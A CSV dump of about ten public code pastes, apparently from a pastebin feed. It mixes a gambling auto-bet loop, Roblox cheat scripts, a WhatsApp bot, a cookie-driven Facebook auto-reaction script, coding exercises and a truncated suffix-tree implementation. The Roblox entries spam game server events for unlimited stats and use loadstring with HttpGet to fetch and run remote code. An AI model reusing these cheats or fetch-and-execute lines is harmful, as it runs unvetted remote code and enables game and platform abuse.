id,title,username,language,date,content
Gu1mEF4e,++ snowybot update,coinwalk,JavaScript,Sunday 24th of September 2023 12:42:56 PM CDT,"var measly = parseFloat(document.getElementById('pct_balance').value);
var div = 80;
var baby = Number((measly/div).toFixed(8));
var moon = baby;
var taget = 200000;
var tens = (baby*10);
var sevens = (baby*7);
var baboon = false;
var upper = 6.9;
var downer = 2.9;
var zoom = ((Math.floor(measly/tens))*tens);
var zoomer = ((Math.floor(measly/tens))*tens);
var olzerer = ((Math.floor(measly/tens))*tens);
var mith = 2;
var bill = true;
var zuel = parseFloat(document.getElementById('pct_balance').value);

 
function get(){
zuel = parseFloat(document.getElementById('pct_balance').value);
if (zuel>(zoom+(moon*upper))) {
    moon = moon*2;
    upper = 4.9;
    downer = 4.9;
    zoom = parseFloat(zuel);
}
if ((zuel<(zoomer-(moon*downer)))&&(bill)) {
    moon = moon*2;
    upper = 4.9;
    downer = 4.9;
    mith = 0;
    bill = false ;
    zoom = parseFloat(zuel);
    zoomer = parseFloat(zuel);
}
if ((zuel<(zoomer-(moon*downer)))&&(!bill)&&(zuel<(((Math.floor(zuel/tens))*tens)+sevens))) {
    moon = baby;
    upper = 6.9;
    downer = 2.9;
    mith = 1;
    bill = true;
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((zuel>=(olzerer+(tens*mith)))&&(zuel<(((Math.floor(zuel/tens))*tens)+sevens))) {
    moon = baby;
    upper = 6.9;
    downer = 2.9;
    mith = 1;
    bill = true;
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
    if (zuel >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }    
var funeral = (zuel - measly).toFixed(8);
console.log(""profit"");
console.log(funeral); 
        $('#pct_chance').val(49.5);
        $('#pct_bet').val(((moon*1).toFixed(8)));
        $('#a_lo').click();
    setTimeout(() => get(), 1);
}
get();"
5gyYqPwU,Pull a Sword,LuaXe,Lua,Sunday 24th of September 2023 12:17:32 PM CDT,"function C() spawn(function () while getgenv().C do local args = {[1] = ""Click""} game:GetService(""ReplicatedStorage"").ClickEvent:FireServer(unpack(args)) wait() end end) end
function R() spawn(function () while getgenv().R do game:GetService(""ReplicatedStorage"").GameClient.Events.RemoteEvent.RebirthEvent:FireServer() wait() end end) end

local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()

local w = library:CreateWindow(""Pull A Sword"")

local b = w:CreateFolder(""Main"")

b:Toggle(""Inf. Strength"",function(val) getgenv().C = val C() end)
b:Toggle(""Inf. Rebirths"",function(val) getgenv().R = val R() end)

b:Label(""Made by LuaXie"",{TextSize = 21; TextColor = Color3.fromRGB(255,255,255); BgColor = Color3.fromRGB(38, 38, 38);})

local w = library:CreateWindow(""LocalPlayer"")

local b = w:CreateFolder(""LP"")

b:DestroyGui()

b:Button(""Discord"",function() setclipboard(""workink.co/2GQ/LTD"") end)
b:Button(""Full Version"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/GphZf9Xe"", true))() end)
b:Button(""Rejoin"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/mM7JBG5h"", true))() end)
b:Button(""Reset"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/EEY6SATj"", true))() end)

b:Box(""Speed"",""number"",function(val) S = val end)
b:Box(""Jump"",""number"",function(val) J = val end)
b:Box(""Hip Height"",""number"",function(val) H = val end)
b:Box(""Gravity"",""number"",function(val) G = val end)
 
b:Toggle(""Speed"",function(bool) getgenv().Speed = bool Speed(S) end)
b:Toggle(""Jump"",function(bool) getgenv().Jump = bool Jump(J) end)
b:Toggle(""Hip Height"",function(bool) getgenv().Hip = bool Hip(H) end)
b:Toggle(""Gravity"",function(bool) getgenv().Grav = bool Grav(G) end)
 
b:Slider(""FOV (Default is 70)"",{min = 0;max = 120;precise = true;},function(val) game.workspace.CurrentCamera.FieldOfView = val end)

function TPCFrame(Player_CFrame) if game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player_CFrame.CFrame end end
function TPVector3(Player_Position) game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Player_Position.Position end
function PHP(Player_HP) game.Players.LocalPlayer.Character.Humanoid.Health = Player_HP end

function Chat(Mes, Freq) spawn(function () while getgenv().Chat do local args = {[1] = Mes,[2] = ""All""} game:GetService(""ReplicatedStorage"").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args)) wait(Freq) end end) end
function Speed(Nume) spawn(function () while getgenv().Speed do game:GetService(""Players"").LocalPlayer.Character.Humanoid.WalkSpeed = Nume if not getgenv().Speed then game:GetService(""Players"").LocalPlayer.Character.Humanoid.WalkSpeed = 16 end wait() end end) end
function Jump(Nume) spawn(function () while getgenv().Jump do game:GetService(""Players"").LocalPlayer.Character.Humanoid.JumpPower = Nume if not getgenv().Jump then game:GetService(""Players"").LocalPlayer.Character.Humanoid.JumpPower = 50 end wait() end end) end
function Hip(Nume) spawn(function () while getgenv().Hip do game:GetService(""Players"").LocalPlayer.Character.Humanoid.HipHeight = Nume if not getgenv().Hip then game:GetService(""Players"").LocalPlayer.Character.Humanoid.HipHeight = 0.1 end wait() end end) end
function Grav(Nume) spawn(function () while getgenv().Grav do game:GetService(""Workspace"").Gravity = Nume if not getgenv().Grav then game:GetService(""Workspace"").Gravity = 196.2 end wait() end end) end"
g74T3W56,Untitled,dllbridge,C,Sunday 24th of September 2023 12:07:19 PM CDT,"

#include    <stdio.h>
#include   <string.h>

int _strlen(char *); 
int _strcpy(char *psz, const char *);
// int _strcat(char *psz, const char *);

char sz [100] = ""S_ONY"",
     sz2[100] = ""_Pictures"";
  
   
//////////////////////////////////////////////////////// 
int main()                                            //
{
	
   _strcpy(sz, ""Sobolev Dima"");
	
	
	printf(""sz = %s\n"", sz);	
	
}



//////////////////////////////////////////////////////// 0 = FALS
int _strcpy(char *psz, const char *psz2)              // 1 = TRUE
{
	
	int nLen = 0;
	
	
	while(psz2[nLen])
	{
		
		nLen += 1;
	}	
	
	
	for(int i = 0; i < nLen; i++)
	{
		
	    psz[i] = psz2[i];	
	}
	
	psz[nLen] = 0;
}



//////////////////////////////////////////////////////// 0 = FALS
int _strlen(char *psz)                                 // 1 = TRUE
{
	
	int nLen = 0;
	
	
	while(psz[nLen])
	{
		
		nLen += 1;
	}
	
	
return nLen;
}"
kzMP1XiR,p07HandsOfCards,kolevra,Java,Sunday 24th of September 2023 12:06:29 PM CDT,"package a09_20_SetsAMapsAdvanced_Ex;

import java.util.*;

public class p07HandsOfCards {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        String input = scanner.nextLine();

        Map<String, HashSet<String>> playersSets = new LinkedHashMap<>();

        while (!""JOKER"".equals(input)) {

            String[] nameSplit = input.split("": "");

            String name = nameSplit[0];
            playersSets.putIfAbsent(name, new HashSet<>());

            String[] cardsArr = nameSplit[1].split("", "");
            HashSet<String> cardsSet = playersSets.get(name);
            cardsSet.addAll(Arrays.asList(cardsArr));

            input = scanner.nextLine();
        }


        playersSets.forEach((key, value) -> {
            int currentScore = calculatePoints(value);
            System.out.println(key + "": "" + currentScore);

        });


    }

    public static int calculatePoints(Set<String> inputSet) {

        int totalPoints = 0;

        for (String e : inputSet) {
            String cardPower = e.substring(0, e.length() - 1);
            String color = String.valueOf(e.charAt(e.length() - 1));

            totalPoints += checkCardValue(cardPower) * checkCardValue(color);

        }

        return totalPoints;

    }

    public static int checkCardValue(String card) {

        int value = switch (card) {
            case ""C"" -> 1;
            case ""2"", ""D"" -> 2;
            case ""3"", ""H"" -> 3;
            case ""4"", ""S"" -> 4;
            case ""5"" -> 5;
            case ""6"" -> 6;
            case ""7"" -> 7;
            case ""8"" -> 8;
            case ""9"" -> 9;
            case ""10"" -> 10;
            case ""J"" -> 11;
            case ""Q"" -> 12;
            case ""K"" -> 13;
            case ""A"" -> 14;
            default -> 0;
        };

        return value;

    }

}
"
YUhNEncG,Untitled,pedrocasdev,C++,Sunday 24th of September 2023 11:58:06 AM CDT,"/*
 * Author : pedrocas
 * Date   : 2023 Sep 24 04:50:39 PM
*/

#include <bits/stdc++.h>
 
using namespace std;
 
typedef long long ll;
const long long mod = 1000000007;
ll gcd (ll a, ll b) {return b==0 ? a : gcd(b, a%b);}
 
#define all(c) (c).begin(),(c).end()
#define pb push_back
#define mp make_pair
#define fastio ios_base::sync_with_stdio(false); cin.tie(nullptr);
 
const int di4[] = {-1, 0, 1,  0};
const int dj4[] = { 0, 1, 0, -1};
const int di8[] = {-1, 0, 1,  0, -1, 1,-1,1};
const int dj8[] = { 0, 1, 0, -1, -1, 1,1,-1};
 
const int maxn = 2e5 + 10;
const ll INF = 1e18;
 
int main()
{
#ifdef LOCAL
    freopen(""input.txt"", ""rt"", stdin);
    freopen(""output.txt"", ""wt"", stdout);
#endif
	fastio
	int tc = 1;
	//cin >> tc;
	while(tc-- ){
		int n;cin >> n;
		set<int> st;
		for(int i = 0, x; i<n; i++)cin >> x, st.insert(x);
		while(--n){
			string s;cin >> s;
			int c = tolower(s[s.size() - 1]) - 'a' + 1;	
			int x = *st.begin(), y = *st.rbegin();
			if(abs(x - c) > abs(y - c)){
				st.erase(x);	
			}else if(abs(x - c) < abs(y - c)){
				st.erase(y);	
			}else{
				if(x > y){
					st.erase(y);
				}else st.erase(x);

			}
		}
		cout << *st.begin() <<endl;

	}
	return 0;
}

"
XHwZtZNF,github scripts,2AreYouMental110,Lua,Sunday 24th of September 2023 11:57:37 AM CDT,"-- these are scripts reuploaded to github

-- Break in 2
loadstring(game:HttpGet(""https://raw.githubusercontent.com/2AreYouMental110/Scripts/main/Break%20In%202""))()

-- The Chosen One
loadstring(game:HttpGet(""https://raw.githubusercontent.com/2AreYouMental110/Scripts/main/The%20Chosen%20One""))()

-- Game Annoyance
loadstring(game:HttpGet(""https://raw.githubusercontent.com/2AreYouMental110/Scripts/main/game%20annoyance""))()

-- Total Roblox Drama See Votes
loadstring(game:HttpGet(""https://raw.githubusercontent.com/2AreYouMental110/Scripts/main/trd%20see%20votes""))()

-- Build An Obby Admin Remake
loadstring(game:HttpGet(""https://raw.githubusercontent.com/2AreYouMental110/Scripts/main/build%20an%20obby%20admin%20remake""))()

-- Infectious Smile Gui 2
loadstring(game:HttpGet(""https://raw.githubusercontent.com/2AreYouMental110/Scripts/main/infectious%20smile%20gui%202""))()

-- Total Roblox Drama Math Mania
loadstring(game:HttpGet(""https://raw.githubusercontent.com/2AreYouMental110/Scripts/main/trd%20math%20mania""))()"
tfTJrQQE,Auto Typing WhatApp,ngatmuri,JavaScript,Sunday 24th of September 2023 11:49:24 AM CDT,"const { Client, Location, List, Buttons, LocalAuth} = require('./index');

const qrcode = require('qrcode-terminal');


const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {ffmpegPath: '/path/to/ffmpeg.exe',
    args: ['--no-sandbox','--disable-setuid-sandbox'],
    authStrategy: new LocalAuth()
},
});

client.initialize();

client.on('loading_screen', (percent, message) => {
    console.log('LOADING SCREEN', percent, message);
});

client.on('qr', (qr) => {
    qrcode.generate(qr, {small: true});
    // NOTE: This event will not be fired if a session is specified.
    console.log('QR RECEIVED', qr);
});

client.on('authenticated', () => {
    console.log('AUTHENTICATED');
});

client.on('auth_failure', msg => {
    // Fired if session restore was unsuccessful
    console.error('AUTHENTICATION FAILURE', msg);
});

client.on('ready', () => {
    console.log('READY');
});

client.on('message', async msg => {
    console.log('MESSAGE RECEIVED', msg);

    if (msg.body === '!ping reply') {
        // Send a new message as a reply to the current one
        msg.reply('pong');

    } else if (msg.body === '!ping') {
        // Send a new message to the same chat
        client.sendMessage(msg.from, 'pong');

    } else if (msg.body.startsWith('!sendto ')) {
        // Direct send a new message to specific id
        let number = msg.body.split(' ')[1];
        let messageIndex = msg.body.indexOf(number) + number.length;
        let message = msg.body.slice(messageIndex, msg.body.length);
        number = number.includes('@c.us') ? number : `${number}@c.us`;
        let chat = await msg.getChat();
        chat.sendSeen();
        client.sendMessage(number, message);

    } else if (msg.body.startsWith('!subject ')) {
        // Change the group subject
        let chat = await msg.getChat();
        if (chat.isGroup) {
            let newSubject = msg.body.slice(9);
            chat.setSubject(newSubject);
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body.startsWith('!echo ')) {
        // Replies with the same message
        msg.reply(msg.body.slice(6));
    } else if (msg.body.startsWith('!desc ')) {
        // Change the group description
        let chat = await msg.getChat();
        if (chat.isGroup) {
            let newDescription = msg.body.slice(6);
            chat.setDescription(newDescription);
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body === '!leave') {
        // Leave the group
        let chat = await msg.getChat();
        if (chat.isGroup) {
            chat.leave();
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body.startsWith('!join ')) {
        const inviteCode = msg.body.split(' ')[1];
        try {
            await client.acceptInvite(inviteCode);
            msg.reply('Joined the group!');
        } catch (e) {
            msg.reply('That invite code seems to be invalid.');
        }
    } else if (msg.body === '!groupinfo') {
        let chat = await msg.getChat();
        if (chat.isGroup) {
            msg.reply(`
                *Group Details*
                Name: ${chat.name}
                Description: ${chat.description}
                Created At: ${chat.createdAt.toString()}
                Created By: ${chat.owner.user}
                Participant count: ${chat.participants.length}
            `);
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body === '!chats') {
        const chats = await client.getChats();
        client.sendMessage(msg.from, `The bot has ${chats.length} chats open.`);
    } else if (msg.body === '!info') {
        let info = client.info;
        client.sendMessage(msg.from, `
            *Connection info*
            User name: ${info.pushname}
            My number: ${info.wid.user}
            Platform: ${info.platform}
        `);
    } else if (msg.body === '!mediainfo' && msg.hasMedia) {
        const attachmentData = await msg.downloadMedia();
        msg.reply(`
            *Media info*
            MimeType: ${attachmentData.mimetype}
            Filename: ${attachmentData.filename}
            Data (length): ${attachmentData.data.length}
        `);
    } else if (msg.body === '!quoteinfo' && msg.hasQuotedMsg) {
        const quotedMsg = await msg.getQuotedMessage();

        quotedMsg.reply(`
            ID: ${quotedMsg.id._serialized}
            Type: ${quotedMsg.type}
            Author: ${quotedMsg.author || quotedMsg.from}
            Timestamp: ${quotedMsg.timestamp}
            Has Media? ${quotedMsg.hasMedia}
        `);
    } else if (msg.body === '!resendmedia' && msg.hasQuotedMsg) {
        const quotedMsg = await msg.getQuotedMessage();
        if (quotedMsg.hasMedia) {
            const attachmentData = await quotedMsg.downloadMedia();
            client.sendMessage(msg.from, attachmentData, { caption: 'Here\'s your requested media.' });
        }
    } else if (msg.body === '!location') {
        msg.reply(new Location(37.422, -122.084, 'Googleplex\nGoogle Headquarters'));
    } else if (msg.location) {
        msg.reply(msg.location);
    } else if (msg.body.startsWith('!status ')) {
        const newStatus = msg.body.split(' ')[1];
        await client.setStatus(newStatus);
        msg.reply(`Status was updated to *${newStatus}*`);
    } else if (msg.body === '!mention') {
        const contact = await msg.getContact();
        const chat = await msg.getChat();
        chat.sendMessage(`Hi @${contact.number}!`, {
            mentions: [contact]
        });
    } else if (msg.body === '!delete') {
        if (msg.hasQuotedMsg) {
            const quotedMsg = await msg.getQuotedMessage();
            if (quotedMsg.fromMe) {
                quotedMsg.delete(true);
            } else {
                msg.reply('I can only delete my own messages');
            }
        }
    } else if (msg.body === '!pin') {
        const chat = await msg.getChat();
        await chat.pin();
    } else if (msg.body === '!archive') {
        const chat = await msg.getChat();
        await chat.archive();
    } else if (msg.body === '!mute') {
        const chat = await msg.getChat();
        // mute the chat for 20 seconds
        const unmuteDate = new Date();
        unmuteDate.setSeconds(unmuteDate.getSeconds() + 20);
        await chat.mute(unmuteDate);
    } else if (msg.body === '!ketik') {
        const chat = await msg.getChat();
        // simulates typing in the chat
        chat.sendStateTyping();
    } else if (msg.body === '!rekam') {
        const chat = await msg.getChat();
        // simulates recording audio in the chat
        chat.sendStateRecording();



    } else if (msg.body === '!clearstate') {
        const chat = await msg.getChat();
        // stops typing or recording in the chat
        chat.clearState();
    } else if (msg.body === '!jumpto') {
        if (msg.hasQuotedMsg) {
            const quotedMsg = await msg.getQuotedMessage();
            client.interface.openChatWindowAt(quotedMsg.id._serialized);
        }
    } else if (msg.body === '!buttons') {
        let button = new Buttons('Button body',[{body:'bt1'},{body:'bt2'},{body:'bt3'}],'title','footer');
        client.sendMessage(msg.from, button);
    } else if (msg.body === '!list') {
        let sections = [{title:'sectionTitle',rows:[{title:'ListItem1', description: 'desc'},{title:'ListItem2'}]}];
        let list = new List('List body','btnText',sections,'Title','footer');
        client.sendMessage(msg.from, list);
    } else if (msg.body === '!reaction') {
        msg.react('👍');
    }
});


function getRandomItem(arr) {

    // get random index value
    const randomIndex = Math.floor(Math.random() * arr.length);

    // get random item
    const item = arr[randomIndex];

    return item;
}

const array = ['💛','💙','💜','💚','❤','💔','💗','💓','💕','💖','💞','💘','💌'];

const result = getRandomItem(array);


client.on('message', async (msg) => {
    const chat = await msg.getChat();
    const contact = await msg.getContact();
    
await msg.react(getRandomItem(array));
});



//disini Edit


sleep(15000).then(() => {

    
    
    
client.on('message', async (msg) => {
    const chat = await msg.getChat();
    const contact = await msg.getContact();
    
    chat.sendStateRecording();
    // await chat.sendStateTyping();
    var n=20000000;
 
    for(var i=1; i<=n; i++){
        await sleep(15000);

    await  console.log(chat.sendStateTyping());
    }
    });
}) 
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    

        // Ketik

    //Rekam 
    /*
    client.on('message', async (msg) => {
        const chat = await msg.getChat();
        const contact = await msg.getContact();
        
        await chat.sendStateTyping();

        }); */

client.on('message_create', (msg) => {
    // Fired on all message creations, including your own
    if (msg.fromMe) {
        // do stuff here
    }
});

client.on('message_revoke_everyone', async (after, before) => {
    // Fired whenever a message is deleted by anyone (including you)
    console.log(after); // message after it was deleted.
    if (before) {
        console.log(before); // message before it was deleted.
    }
});

client.on('message_revoke_me', async (msg) => {
    // Fired whenever a message is only deleted in your own view.
    console.log(msg.body); // message before it was deleted.
});

client.on('message_ack', (msg, ack) => {
    /*
        == ACK VALUES ==
        ACK_ERROR: -1
        ACK_PENDING: 0
        ACK_SERVER: 1
        ACK_DEVICE: 2
        ACK_READ: 3
        ACK_PLAYED: 4
    */

    if(ack == 3) {
        // The message was read
    }
});

client.on('group_join', (notification) => {
    // User has joined or been added to the group.
    console.log('join', notification);
    notification.reply('Selamat Datang, yang baru Gabung..');
});

client.on('group_leave', (notification) => {
    // User has left or been kicked from the group.
    console.log('leave', notification);
    notification.reply('Yah, Ada yang Keluar...');
});

client.on('group_update', (notification) => {
    // Group picture, subject or description has been updated.
    console.log('update', notification);
});

client.on('change_state', state => {
    console.log('CHANGE STATE', state );
});

// Change to false if you don't want to reject incoming calls
let rejectCalls = false; //false aktif

client.on('call', async (call) => {
    console.log('Call received, rejecting. GOTO Line 261 to disable', call);
    if (rejectCalls) await call.reject();
    await client.sendMessage(call.from, `[${call.fromMe ? 'Outgoing' : 'Incoming'}] Phone call from ${call.from}, type ${call.isGroup ? 'group' : ''} ${call.isVideo ? 'video' : 'audio'} call. ${rejectCalls ? 'This call was automatically rejected by the script.' : ''}`);
});

client.on('disconnected', (reason) => {
    console.log('Client was logged out', reason);
});"
Lz3PqicZ,Autoreaction  Facebook,ngatmuri,PHP,Sunday 24th of September 2023 11:46:41 AM CDT,"<?php
 
$cookie = """";
$urlprofile = ""https://m.facebook.com/profile.php"";
$urlhome = ""https://web.facebook.com/home.php?sk=h_chr"";
$urls = curl(""https://m.facebook.com/profile.php"", $cookie);
preg_match('#<title>(.+?)</title>#is',$urls, $nm);
$name = $nm[1];
preg_match('#name=""target"" value=""(.+?)""#is',$urls, $trgt); 
$id_user = $trgt[1];
preg_match('#name=""fb_dtsg"" value=""(.+?)""#is',$urls, $fbdtsg);
$fb_dtsg = $fbdtsg[1];
$react = array(""16"");
$react = $react[array_rand($react)];
 
$ex = curl($urlhome, $cookie);
if(preg_match_all('#ft_ent_identifier=(.+?)&#is', $ex, $gets)) {
for($i = 0; $i < $gets[1]; $i++) {
echo post_data(""https://mobile.facebook.com/ufi/reaction/?ft_ent_identifier="" . $gets[1][$i] . ""&story_render_location=feed_mobile&feedback_source=1&ext=1481005962&hash=AeQ4UUnFz59Av9t5&refid=8&_ft_=qid.6359758912943651311%3Amf_story_key.-7381576517051739942%3Atop_level_post_id.1864991263733728&av="" . $id_user . ""&client_id=1480746770343%3A1208387900&session_id=d06a94e"", ""reaction_type="" . $react . ""&ft_ent_identifier="" . $gets[1][$i] . ""&m_sess=&fb_dtsg="" . $fb_dtsg . ""&__dyn=1KQEGho5q5UjwgqgWF48xO6ES9xG6UO3m2i5UfUdoaoS2W1DwywlEf8lwJwwwj8qw8K19x61YCw9y4o52&__req=8&__ajax__=AYlpFTgedhZpQN6Xa3bjcqPQSPGdIKK-fJ0z-WBYLUsYSRpMZh2tQMCB-kn2M8LJrHfPFI4SxqYF22XCznsNr7RaGnRRaO4Tm8ucCWF32Wr7OA&__user="" . $id_user, $cookie);
} 
} 
 
function post_data($site,$data,$cookie){
                $datapost = curl_init();
                $headers = array(""Expect:"");
                curl_setopt($datapost, CURLOPT_URL, $site);
                curl_setopt($datapost, CURLOPT_TIMEOUT, 30);
                curl_setopt($datapost, CURLOPT_HEADER, TRUE);
 
                curl_setopt($datapost, CURLOPT_RETURNTRANSFER, TRUE);
                curl_setopt($datapost, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($datapost, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36');
                curl_setopt($datapost, CURLOPT_POST, TRUE);
                curl_setopt($datapost, CURLOPT_POSTFIELDS, $data);
                curl_setopt($datapost, CURLOPT_COOKIE,$cookie);
                ob_start();
                return curl_exec ($datapost);
//    ob_end_clean();
//    curl_close ($datapost);
//    unset($datapost);
            }
 
function curl($url,$cookie)
            {
                $ch = @curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                $head[] = ""Connection: keep-alive"";
                $head[] = ""Keep-Alive: 300"";
                $head[] = ""Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7"";
                $head[] = ""Accept-Language: en-us,en;q=0.5"";
                curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
                curl_setopt($ch, CURLOPT_ENCODING, '');
                curl_setopt($ch, CURLOPT_COOKIE, $cookie);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, TRUE);
                curl_setopt($ch, CURLOPT_TIMEOUT, 30);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Expect:'
                ));
                $page = curl_exec($ch);
                curl_close($ch);
                return $page;
            }
?>"
QeF2xYa8,Mad,Unknown_No_1,PHP,Sunday 24th of September 2023 11:39:46 AM CDT,ThanksForSupportMadGamerTG 
MhrAFEUW,Untitled,AlexG2230954,C++,Sunday 24th of September 2023 11:32:55 AM CDT,"#include <iostream>
#include <memory>
#include <vector>
#include <string>
#include <set>

using namespace std;

struct TStringSlice {
    const string& SourceString;
    size_t Start;
    shared_ptr<size_t> End;

    TStringSlice(const string& str, const size_t& start, shared_ptr<size_t> end) 
        : SourceString(str), Start(start), End(end) {}

    TStringSlice(const string& str, const size_t& start, size_t end) 
        : SourceString(str), Start(start), End(make_shared<size_t>(end)) {}

    char operator[](const size_t& i) const {
        return SourceString[Start + i];
    }

    void Update(const TStringSlice& other) {
        Start = other.Start;
        End = other.End;
    }

    size_t Length() const {
        return *End - this->Start;
    }

    string ToString() const {
        return SourceString.substr(Start, (*End) - Start);
    }

    TStringSlice Slice(int a, int b) const {
        size_t newStart = a == -1 ? Start : Start + a;
        if (b == -1)
            return TStringSlice(SourceString, newStart, End);
        return TStringSlice(SourceString, newStart, Start + b);
    }

};

struct TNode;

struct TEdge {
    TStringSlice Value;
    TNode* Node;

    void Split(size_t index);

};

struct TNode {
    vector<TEdge> Children;
    TNode* Parent = nullptr;
    TNode* SuffixLink = nullptr;
    size_t ParentEdge = 0;
    int TextFlag = 0;

    TNode* Add(const TEdge& edge) {
        Children.push_back(edge);

        TEdge* createdEdge = &(Children[Children.size() - 1]);
        createdEdge->Node->Parent = this;
        createdEdge->Node->ParentEdge = Children.size() - 1;

        return edge.Node;
    }

};

void TEdge::Split(size_t index) {
    TNode* newNode = new TNode();
    newNode->Parent = Node->Parent;
    newNode->ParentEdge = Node->ParentEdge;
    Node->Parent = newNode;
    newNode->Add({Value.Slice(index, -1), Node});
    Node = newNode;
    Value.Update(Value.Slice(-1, index));
}

struct TCursor {
    TNode* Node;
    TEdge* Edge = nullptr;
    size_t Index = 0;

    void MoveToNode(TNode* node) {
        this->Node = node;
        Edge = nullptr;
        Index = 0;
    }

    void ChooseEdgeByChar(char chr) {
        for(TEdge& nodeEdge: Node->Children) {
            if (nodeEdge.Value[0] == chr) {
                Edge = &nodeEdge;
                Index = 0;
                break;
            }
        }
    }

    void MoveToParentEdge() {
        Edge = &(Node->Parent->Children[Node->ParentEdge]);
        Node = Node->Parent;
        Index = Edge->Value.Length() - 1;
    }

    bool Next(char chr) {
        if (!IsNode() && (Index + 1 >= Edge->Value.Length()))
            MoveToNode(Edge->Node);

        if (Edge == nullptr) {
            ChooseEdgeByChar(chr);
            return Edge != nullptr;
        }

        if (Edge->Value[Index + 1] != chr)
            return false;
    
        Index++;
        return true;
    }

    bool Prev() {
        if (IsNode()) {
            if (Node->Parent != nullptr) {
                MoveToParentEdge();
                return true;
            }
            return false;
        }

        if (Index == 0) {
            Edge = nullptr;
            return true;
        }

        Index--;
        return true;
    }

    bool IsNode() const {
        return Edge == nullptr;
    }

};

struct TCompactTrie {
    TNode Root;
  
    TCursor GetCursor() {
        return {&Root};
    }
};

struct TState {
    const string& SourceString;
    TCursor Cursor;
    int TextFlag;
    shared_ptr<size_t> End;
    TNode* LastMiddleNode;
    bool NeedUpdate;
};

void InsertString(const TStringSlice& str, TState& state);
void Iterate(const TStringSlice& str, bool fastMode, TState& state);
void GoBack(TState& state);

void UpdateSuffixLinks(TState& state) {
    if (state.LastMiddleNode != nullptr) {
        state.LastMiddleNode->SuffixLink = state.Cursor.Node;
    }
    state.LastMiddleNode = state.Cursor.Node;
}

void UpdateTextFlag(TState& state) {
    set<TNode*> seenNodes;

    while (!state.Cursor.IsNode()) {
        state.Cursor.MoveToNode(state.Cursor.Edge->Node);
        
        if(seenNodes.find(state.Cursor.Node) == seenNodes.end()) {
            state.Cursor.Node->TextFlag |= state.TextFlag;
            seenNodes.insert(state.Cursor.Node);
            GoBack(state);
        }
    }
}

void InsertString(const TStringSlice& str, TState& state) {

    if (state.Cursor.IsNode()) {
        TNode* newNode = state.Cursor.Node->Add({str, new TNode()});
        newNode->TextFlag |= state.TextFlag;
        state.NeedUpdate = state.Cursor.Node->Parent != nullptr;
        state.Cursor.MoveToNode(newNode);
    } else {
        state.Cursor.Edge->Split(state.Cursor.Index + 1);
        state.Cursor.MoveToNode(state.Cursor.Edge->Node);
        UpdateSuffixLinks(state);
        TNode* newNode = state.Cursor.Node->Add({str, new TNode()});
        newNode->TextFlag |= state.TextFlag;
        state.Cursor.MoveToNode(newNode);
        state.NeedUpdate = true;
    }

}

void Iterate(const TStringSlice& str, bool fastMode, TState& state) {

    size_t index = 0;

    while (index < str.Length()) {
        if (!state.Cursor.Next(str[index])) {

            InsertString(str.Slice(index, -1), state);
            break;
        }

        if (fastMode) {
            size_t minLength = min(
                state.Cursor.Edge->Value.Length(),
                str.Length() - index
            ) - 1;

            state.Cursor.Index = minLength;
            index += minLength;
        }

        index++; 
        
    }
}

TEdge* JumpToParent(TCursor& cursor) {
    cursor.Prev();
    TEdge* parentEdge = cursor.Edge;
    cursor.MoveToNode(cursor.Node);
    return parentEdge;
}

void GoBack(TState& state) {
    
    TEdge* edge = JumpToParent(state.Cursor);

    if (state.Cursor.Node->Parent != nullptr) {
        if (state.Cursor.Node->SuffixLink != nullptr) {
            state.Cursor.MoveToNode(state.Cursor.Node->SuffixLink);
        } else {
            GoBack(state);
        }

        Iterate(edge->Value, !edge->Node->Children.empty(), state);
    } else {
        Iterate(edge->Value.Slice(1, -1), !edge->Node->Children.empty(), state); 
    }
}

void StartStep(TState& state) {

    state.NeedUpdate = true;

    while(state.NeedUpdate) {
        state.NeedUpdate = false;
        
        if (state.Cursor.IsNode()) {
            GoBack(state);
        } else {
            Iterate({state.SourceString, (*state.End) - 1, state.End}, false, state);
        }
    }
}

TCompactTrie* BuildSuffixTrie(const string& str, TCompactTrie* trie = nullptr, int textFlag = 0) {
    TCompactTrie* t = (trie == nullptr) ? new TCompactTrie() : trie;
    TState state { str, t->GetCursor(), textFlag, make_shared<size_t>(0), nullptr, false };

    (*state.End)++;
    Iterate({str, 0, state.End}, false, state);

    while((*state.End) < str.size()) {
        (*state.End)++;
        StartStep(state);
        state.LastMiddleNode = nullptr;
        
    }

    UpdateTextFlag(state);
    return t;
}

void ExtendTextFlags(TNode* node) {
    for (const TEdge& child: node->Children) {
